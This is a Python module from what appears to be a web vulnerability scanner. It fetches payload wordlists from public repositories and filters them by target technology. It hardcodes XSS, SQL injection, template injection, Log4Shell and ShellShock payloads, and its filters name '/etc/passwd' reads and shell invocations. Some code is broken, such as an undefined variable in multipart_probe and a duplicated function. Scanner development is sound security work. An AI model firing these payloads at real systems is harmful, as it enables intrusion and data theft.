from __future__ import annotations
import os, json, re, subprocess, shlex, time
from pathlib import Path
from typing import List, Iterable, Dict, Any, Tuple, Set


def _to_path_or_none(v):
    """Normalize various root representations into pathlib.Path or None.
    Accepts str (whitespace-trimmed), PathLike, or Path. Empty strings -> None.
    """
    if v is None:
        return None
    if isinstance(v, (Path, os.PathLike)):
        return Path(v)
    if isinstance(v, str):
        s = v.strip()
        return Path(s) if s else None
    # Unknown type: refuse silently by returning None (keeps previous behavior of skipping missing roots)
    return None


# --- Config loading ---------------------------------------------------------

def _load_config_path() -> Path | None:
    env = os.getenv('WS_CONFIG')
    if env:
        p = Path(env)
        return p if p.exists() and p.is_file() else None
    local = Path('./config.json')
    return local if local.exists() and local.is_file() else None

def _load_cfg() -> dict:
    p = _load_config_path()
    if not p:
        return {}
    txt = p.read_text(encoding='utf-8', errors='ignore')
    return json.loads(txt) if txt.strip() else {}

def _read_lines(path: Path) -> list[str]:
    if not isinstance(path, Path):
        path = Path(path)
    if (not path.exists()) or (not path.is_file()):
        return []
    txt = path.read_text(encoding='utf-8', errors='ignore')
    out: list[str] = []
    for line in txt.splitlines():
        s = line.strip()
        if not s or s.startswith('#'):
            continue
        out.append(s)
    return out

def _glob_many(root: Path, patterns: Iterable[str]) -> list[str]:
    out: list[str] = []
    for pat in patterns:
        for p in root.glob(pat):
            out.extend(_read_lines(p))
    return out

def _dedup_preserve(seq: Iterable[str], limit: int | None = None) -> list[str]:
    seen, out = set(), []
    for s in seq:
        s = (s or "").strip()
        if not s:
            continue
        if len(s) > 2048:  # sanity
            continue
        if s in seen:
            continue
        seen.add(s)
        out.append(s)
        if limit and len(out) >= limit:
            break
    return out

# --- Templating for placeholder tokens -------------------------------------

_MARK_TOKENS = ["§", "{{MARK}}", "{MARK}", "<MARK>", "{{XSS}}", "{{INJECT}}", "XSS_MARK", "FUZZ", "%%MARK%%"]

def _apply_marker(payloads: list[str], marker: str | None) -> list[str]:
    if not marker:
        return payloads
    out: list[str] = []
    for s in payloads:
        repl = s
        for tok in _MARK_TOKENS:
            if tok in repl:
                repl = repl.replace(tok, marker)
        out.append(repl)
    return out

# --- Defaults for common repos ---------------------------------------------

# Helper to find package root dynamically
def _get_package_root() -> Path:
    # payloads.py is in websecure/core/, so root is three levels up -> WebSecure (Project Root)
    return Path(__file__).resolve().parent.parent.parent

_PKG_ROOT = _get_package_root()

_DEFAULTS = {
    "seclists": {
        "root": _PKG_ROOT / "wordlists/seclists",
        "git": "https://github.com/danielmiessler/SecLists.git",
        "xss": ["**/Fuzzing/XSS/*.txt", "**/Fuzzing/XSS/*/*.txt", "**/Fuzzing/xss.txt", "**/*xss*.txt"],
        "sqli": ["**/Fuzzing/SQLi/*.txt", "**/*sqli*.txt", "**/*sql-injection*.txt"],
        "rce": ["**/Fuzzing/Command Injection/*.txt", "**/*cmdi*.txt", "**/*command*injection*.txt", "**/*rce*.txt"],
    },
    "pattt": {
        "root": _PKG_ROOT / "wordlists/PayloadsAllTheThings",
        "git": "https://github.com/swisskyrepo/PayloadsAllTheThings.git",
        "xss": ["**/XSS/**/*.txt"],
        "sqli": ["**/SQL Injection/**/*.txt"],
        "rce": ["**/Command Injection/**/*.txt", "**/RCE/**/*.txt"],
    },
    "wordlists_custom": {
        "root": _PKG_ROOT / "wordlists_custom/custom",
        "git": None,
        "xss": ["xss.txt", "xss/*.txt"],
        "sqli": ["sqli.txt", "sqli/*.txt"],
        "rce": ["rce.txt", "rce/*.txt", "cmdi.txt", "cmdi/*.txt"],
    },
}

def _provider_roots(cfg_section: dict) -> dict:
    out = {}
    alias_map = {'custom': 'wordlists_custom'}
    if isinstance(cfg_section, dict):
        for a,b in alias_map.items():
            if a in cfg_section and b not in cfg_section:
                cfg_section[b] = cfg_section[a]
    for prov in ["seclists", "pattt", "wordlists_custom"]:
        sec = cfg_section.get(prov, {}) if isinstance(cfg_section, dict) else {}
        root = Path(sec.get("root") or _DEFAULTS[prov]["root"])
        out[prov] = {
            "root": root,
            "git": sec.get("git", _DEFAULTS[prov]["git"]),
            "xss": sec.get("xss") or _DEFAULTS[prov]["xss"],
            "sqli": sec.get("sqli") or _DEFAULTS[prov]["sqli"],
            "rce": sec.get("rce") or _DEFAULTS[prov]["rce"],
        }
    return out

# --- External sync (git clone/pull) ----------------------------------------

def _is_git_repo(path: Path) -> bool:
    return (path / ".git").exists()

def _run(cmd: str, cwd: Path | None = None, timeout: int = 120) -> tuple[int, str]:
    if not isinstance(cmd, str) or not cmd.strip():
        raise ValueError("cmd boş olamaz")
    if cwd is not None and not cwd.exists():
        raise FileNotFoundError(f"cwd yok: {cwd}")
    # check=False ile returncode döner; hatalar (örn. komut bulunamadı) istisna olarak yükselir
    proc = subprocess.run(
        shlex.split(cmd),
        cwd=str(cwd) if cwd else None,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    return proc.returncode, out

def sync_wordlists(cfg: Dict[str, Any] | None = None) -> Dict[str, Any]:
    """
    Dış wordlist kaynaklarını senkronize eder (git clone/pull).
    config.payloads.sync:true ise çağrılması önerilir.
    """
    cfg = cfg or _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    roots = _provider_roots(pl_cfg)
    report = {}
    for name, sec in roots.items():
        root: Path = sec["root"]
        url = sec.get("git")
        root.parent.mkdir(parents=True, exist_ok=True)
        if root.exists() and _is_git_repo(root):
            code, out = _run("git pull --ff-only", cwd=root)
            report[name] = {"action": "pull", "code": code, "out": (out or "")[-2000:]}
        elif (not root.exists()) and url:
            code, out = _run(f"git clone --depth=1 {url} {str(root)}", cwd=root.parent)
            report[name] = {"action": "clone", "code": code, "out": (out or "")[-2000:]}
        else:
            report[name] = {"action": "skip", "reason": "no git url or already present"}
    return report

# --- Technology-aware filter ------------------------------------------------

# Basit sezgisel eşleştirmeler (genişletilebilir)
_TECH_HINTS: Dict[str, Dict[str, Dict[str, Iterable[str]]]] = {
    # category -> tech_group -> {"include": [None], "exclude": [None]}
    "sqli": {
        "mysql": {"include": [r"(?i)\b(select|union|sleep\()", r"(?i)order\s+by", r"(?i)concat\("],
                  "exclude": [r"(?i)xp_cmdshell", r"(?i)';?\s*waitfor"]},
        "mssql": {"include": [r"(?i)';?\s*waitfor\s+delay", r"(?i)xp_cmdshell", r"(?i)sp_oacreate"],
                  "exclude": [r"(?i)concat\("]},
        "pgsql": {"include": [r"(?i)\bpg_sleep\(", r"(?i)\bgenerate_series\(", r"(?i)array\["], "exclude": []},
        "oracle": {"include": [r"(?i)dbms_pipe.receive_message", r"(?i)utl_http", r"(?i)union\s+select\s+null"],
                   "exclude": [r"(?i)pg_sleep\("]},
        "sqlite": {"include": [r"(?i)\bsqlite_", r"(?i)\bpragma\b"], "exclude": []},
    },
    "xss": {
        "react": {"include": [r"(?i)<svg", r"(?i)onload="], "exclude": [r"(?i){{", r"(?i)<script[^>]*>"]},
        "angular": {"include": [r"(?i){{", r"(?i)ng-app", r"(?i)svg onload"], "exclude": []},
        "vue": {"include": [r"(?i){{", r"(?i)v-on:", r"(?i)@click"], "exclude": []},
        "dom": {"include": [r"(?i)<img\s+src=x\s+onerror=", r"(?i)<svg/onload="], "exclude": []},
        "csp": {"include": [r"(?i)<svg", r"(?i)<img"], "exclude": [r"(?i)<script", r"(?i)javascript:"]},
    },
    "rce": {
        "linux": {"include": [r"(?i);\s*sh\b", r"(?i)\b/bin/sh\b", r"(?i)\bcat\s+/etc/passwd"],
                  "exclude": [r"(?i)cmd\.exe"]},
        "windows": {"include": [r"(?i)&\s*cmd\.exe", r"(?i)\bping\s+-n\b", r"(?i)\btype\s+C:\\\\"],
                    "exclude": [r"(?i)/bin/sh"]},
    },
}

def _match_any(patterns: Iterable[str], s: str) -> bool:
    for pat in patterns:
        if re.search(pat, s):
            return True
    return False

def filter_by_technology(payloads: list[str], category: str, tech_tags: Iterable[str] | None) -> list[str]:
    """
    Basit teknoloji farkındalığı: verilen tech_tags (ör. {'mysql','react','linux'}) için
    o kategoriye ait include/exclude sezgilerini uygular.
    """
    if not tech_tags:
        return payloads
    category = (category or "").lower().strip()
    rules = _TECH_HINTS.get(category) or {}
    tags = {t.lower() for t in tech_tags if t}
    # Birden çok teknoloji etiketinde birleşim: include herhangi biri, exclude herhangi biri
    includes: List[str] = []
    excludes: List[str] = []
    for t in tags:
        r = rules.get(t)
        if not r:
            continue
        includes.extend(list(r.get("include") or []))
        excludes.extend(list(r.get("exclude") or []))
    if not includes and not excludes:
        return payloads
    out: list[str] = []
    for s in payloads:
        ok = True
        if includes:
            ok = _match_any(includes, s)
        if ok and excludes:
            if _match_any(excludes, s):
                ok = False
        if ok:
            out.append(s)
    # Eğer aşırı daraltma olduysa, orijinal setten bir miktar fallback ekle
    if len(out) < max(20, len(payloads) // 20):
        out = _dedup_preserve(list(out) + payloads[:50], limit=len(out) + 50)
    return out

# --- Public API -------------------------------------------------------------

def _provider_roots(cfg_section: dict) -> dict:
    out = {}
    alias_map = {'custom': 'wordlists_custom'}
    if isinstance(cfg_section, dict):
        for a,b in alias_map.items():
            if a in cfg_section and b not in cfg_section:
                cfg_section[b] = cfg_section[a]
    for prov in ["seclists", "pattt", "wordlists_custom"]:
        sec = cfg_section.get(prov, {}) if isinstance(cfg_section, dict) else {}
        root = Path(sec.get("root") or _DEFAULTS[prov]["root"])
        out[prov] = {
            "root": root,
            "git": sec.get("git", _DEFAULTS[prov]["git"]),
            "xss": sec.get("xss") or _DEFAULTS[prov]["xss"],
            "sqli": sec.get("sqli") or _DEFAULTS[prov]["sqli"],
            "rce": sec.get("rce") or _DEFAULTS[prov]["rce"],
        }
    return out

def load_external_payloads(category: str, marker: str | None = None) -> list[str]:
    """
    category: 'xss','sqli','rce', veya ALLOWED_CATEGORIES içinde tanımlı diğerleri.
    Sağlayıcıların pattern haritaları üzerinden tarama yapar.
    """
    category = (category or "").lower().strip()

    # Kategori doğrulamasını esnet: bilinmeyen kategoride de config'e verilmiş pattern'ler kullanılabilir.
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
    if pl_cfg is False or not isinstance(pl_cfg, dict):
        return []

    # enabled providers order
    providers = pl_cfg.get("providers") or ["seclists", "pattt", "wordlists_custom"]
    if isinstance(providers, dict):
        providers = list(providers.keys())

    # alias normalizasyonu
    prov_map = {"custom": "wordlists_custom", "builtin": None}
    norm, seen = [], set()
    for p in providers:
        q = prov_map.get(p, p)
        if not q:
            continue
        if q in ("wordlists_custom", "seclists", "pattt") and q not in seen:
            norm.append(q)
            seen.add(q)
    if "wordlists_custom" not in seen:
        norm = ["wordlists_custom"] + norm
    providers = norm

    roots = _provider_roots(pl_cfg)

    items: list[str] = []
    for prov in providers:
        sec = roots.get(prov) or {}
        raw_root = sec.get("root") if isinstance(sec, dict) else None
        root = _to_path_or_none(raw_root)
        if not root or not root.exists():
            continue
        pats = (sec.get(category) or []) if isinstance(sec, dict) else []
        items.extend(_glob_many(root, pats))

    # trim & dedup
    maxn = pl_cfg.get("max_per_category", os.getenv("WS_PAYLOADS_MAX", "500"))
    maxn = int(str(maxn)) if str(maxn).strip().isdigit() else 500
    dd = bool(pl_cfg.get("dedup", True))

    items = _apply_marker(items, marker)
    if dd:
        items = _dedup_preserve(items, limit=maxn)
    else:
        items = items[:maxn]
    return items

def get_payloads(
    category: str,
    *,
    marker: str | None = None,
    tech_tags: Iterable[str] | None = None,
    do_sync: bool | None = None,
) -> list[str]:
    """
    Yüksek seviye API:
      - do_sync True ise wordlist kaynaklarını git üzerinden senkronize eder.
      - dış payloadları yükler (Sağlayıcılar örn: SecLists, PATTT, wordlists_custom).
      - technology-aware filtre uygular.
      - dedup & limit uygular (yükleme fonksiyonu içinde).
      - Aynı process içinde tekrar çağrılarda basit cache kullanır.
    """
    cfg = _load_cfg()
    pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}

    if do_sync or (do_sync is None and bool(pl_cfg.get("sync", False))):
        sync_wordlists(cfg)

    ck = _cache_key(category, marker, tech_tags)
    if ck in _PAYLOAD_CACHE:
        return list(_PAYLOAD_CACHE[ck])

    items = load_external_payloads(category, marker=marker)
    items = filter_by_technology(items, category, tech_tags)

    _PAYLOAD_CACHE[ck] = list(items)
    return items

__all__ = [
    "load_external_payloads",
    "get_payloads",
    "filter_by_technology",
    "sync_wordlists",
]

# === PATCH: WebSecure Upgrade (auto-applied) @ 2025-09-07T16:43:08.489221 ===

# Genişletilmiş kategori desteği
ALLOWED_CATEGORIES = {
    "xss",
    "sqli",
    "rce",
    "nosqli",
    "ssti",
    "redirect",
    "cmdi",
    "lfi",
    "path_traversal",
    "ssrf",
    "open_redirect",
}

# Varsayılan pattern genişletmeleri (mevcut sağlayıcılardaki klasör isimlerine göre)
_DEFAULTS["seclists"].update({
    "nosqli": ["**/*nosql*.txt"],
    "ssti": ["**/*ssti*.txt"],
    "redirect": ["**/*open*redirect*.txt", "**/*redirect*.txt"],
    "cmdi": ["**/Fuzzing/Command Injection/*.txt", "**/*cmdi*.txt"],
    "lfi": ["**/*lfi*.txt", "**/*path*traversal*.txt"],
    "path_traversal": ["**/*traversal*.txt", "**/*path*traversal*.txt"],
    "ssrf": ["**/*ssrf*.txt", "**/SSRF/**/*.txt"],
})

_DEFAULTS["pattt"].update({
    "nosqli": ["**/NoSQL Injection/**/*.txt"],
    "ssti": ["**/Server Side Template Injection/**/*.txt"],
    "redirect": ["**/Open Redirect/**/*.txt"],
    "cmdi": ["**/Command Injection/**/*.txt"],
    "lfi": ["**/LFI/**/*.txt", "**/Path Traversal/**/*.txt"],
    "path_traversal": ["**/Path Traversal/**/*.txt"],
    "ssrf": ["**/SSRF/**/*.txt"],
})

_DEFAULTS["wordlists_custom"].update({
    "nosqli": ["nosqli.txt", "nosqli/*.txt"],
    "ssti": ["ssti.txt", "ssti/*.txt"],
    "redirect": ["redirect.txt", "redirect/*.txt", "open_redirect.txt", "open_redirect/*.txt"],
    "cmdi": ["cmdi.txt", "cmdi/*.txt"],
    "lfi": ["lfi.txt", "lfi/*.txt", "path_traversal.txt", "path_traversal/*.txt"],
    "path_traversal": ["path_traversal.txt", "path_traversal/*.txt"],
    "ssrf": ["ssrf.txt", "ssrf/*.txt"],
})

_PAYLOAD_CACHE: dict[tuple[str, str | None, tuple[str, None] | None], list[str]] = {}

def _cache_key(category: str, marker: str | None, tech_tags: Iterable[str] | None) -> tuple[
    str, str | None, tuple[str, None] | None]:
    return (category, marker, tuple(sorted([t for t in (tech_tags or []) if t])) or None)

# --- PATCH: extend category patterns (LFI/Traversal/SSRF) ---
_DEFAULTS["seclists"].update({
    "lfi": ["**/*lfi*.txt", "**/*path*traversal*.txt"],
    "path_traversal": ["**/*traversal*.txt", "**/*path*traversal*.txt"],
    "ssrf": ["**/*ssrf*.txt", "**/SSRF/**/*.txt"],
})
_DEFAULTS["pattt"].update({
    "lfi": ["**/LFI/**/*.txt", "**/Path Traversal/**/*.txt"],
    "path_traversal": ["**/Path Traversal/**/*.txt"],
    "ssrf": ["**/SSRF/**/*.txt"],
})
_DEFAULTS["wordlists_custom"].update({
    "lfi": ["lfi.txt", "lfi/*.txt", "path_traversal.txt", "path_traversal/*.txt"],
    "path_traversal": ["path_traversal.txt", "path_traversal/*.txt"],
    "ssrf": ["ssrf.txt", "ssrf/*.txt"],
})

def url_encode_twice(s: str) -> str:
    from urllib.parse import quote
    return quote(quote(s, safe=""), safe="")

def wrap_json(key: str, value: str) -> str:
    return '{"%s":"%s"}' % (key, value.replace('"','\"'))

def wrap_xml(tag: str, value: str) -> str:
    return f"<{tag}>{value}</{tag}>"

def form_urlencoded(k: str, v: str) -> str:
    from urllib.parse import urlencode
    return urlencode({k: v})

def multipart_probe(name: str, value: str, boundary: str = "----WebSecBoundaryX"):
    tail = f"\r\n--{boundary}--\r\n"
    return head + value + tail

# --- Built-in Payloads (Advanced/Polyglots) ---
BUILTIN_PAYLOADS = {
    "polyglot": [
        "javascript://%250Aalert(1)//\"/*\\'/*\\'/*--></script><xss>",
        "';WAITFOR DELAY '0:0:5'--",
        "\"><script>alert(1)</script>",
        "1;SLEEP(5)#",
        "1 OR 1=1",
        "\"-prompt(8)-\"",
        "'-prompt(8)-'",
        ";|/usr/bin/id|",
        "{{7*7}}",
        "${7*7}",
        "foo\" onmouseover=\"alert(1)",
   ],
   "xss_advanced": [
       "<svg/onload=alert(1)>",
       "<iframe/src=javascript:alert(1)>",
       "<x onfocus=alert(1) autofocus>",
       "<img src=x onerror=alert(1)>",
       "\"><svg/onload=confim(1)>",
       "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
   ],
   "exploit": [
       "${jndi:ldap://127.0.0.1:1389/a}", # Log4Shell
       "${jndi:dns://127.0.0.1:53/a}",
       "{{7*7}}",
       "${7*7}",
       "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di if(%22j%22.equals(%22j%22))...", # Spring4Shell partial
       "() { :;}; /bin/bash -c 'cat /etc/passwd'", # ShellShock
       "() { :;}; /bin/echo 'ShellShock'",
       "pkexec --version",
       "/bin/sh -c 'id'",
       "cat /etc/passwd",
       "root:x:0:0",
   ]
}

def get_builtin_payloads(category: str) -> List[str]:
    """Return hardcoded advanced payloads for a given category."""
    return list(BUILTIN_PAYLOADS.get(category, []))
